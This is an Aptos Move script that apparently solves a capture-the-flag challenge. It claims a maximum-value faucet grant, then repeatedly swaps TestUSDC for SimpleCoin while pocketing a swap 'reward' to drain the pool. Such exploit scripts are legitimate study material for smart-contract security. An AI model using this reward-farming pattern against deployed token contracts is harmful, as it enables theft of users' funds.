script {
    use ctfmovement::simple_coin;
    use ctfmovement::swap;

    use aptos_framework::coin;
    use aptos_framework::signer;

    fun main(sender: &signer){
        swap::check_or_register_coin_store<simple_coin::SimpleCoin>(sender);
        simple_coin::claim_faucet(sender, 0xffffffffffffffffu64);
        
        let amount = 1000000000000u64;

        let i = 0u64;
        let j = 0u64;
        while(i < 7){
            while(j < 2){
                let coin = coin::withdraw<simple_coin::TestUSDC>(sender, amount);
                let (coin_simple, reward) = swap::swap_exact_y_to_x_direct<simple_coin::SimpleCoin, simple_coin::TestUSDC>(coin);
                coin::merge<simple_coin::SimpleCoin>(&mut coin_simple, reward);
                coin::deposit(signer::address_of(sender), coin_simple);
                j = j + 1;
            };
            j = 0;
            amount = amount * 10;
            i = i + 1;
        };
    }
}